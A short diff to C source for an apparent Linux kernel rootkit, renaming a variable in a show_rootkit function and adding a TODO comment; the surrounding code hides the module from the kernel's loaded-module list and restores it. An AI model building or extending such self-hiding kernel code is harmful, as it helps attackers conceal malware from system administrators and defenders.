@@ -26,8 +26,9 @@ void module_hide(void)
 }
 
 // Puts kernel module back into LKM list
+// TODO: Come back to implement this when full hfunc functionality is implemented
 void show_rootkit(void){
-    list_add(&THIS_MODULE->list, prev_module);
+    list_add(&THIS_MODULE->list, module_previous);
     module_track = 1;
 }
 
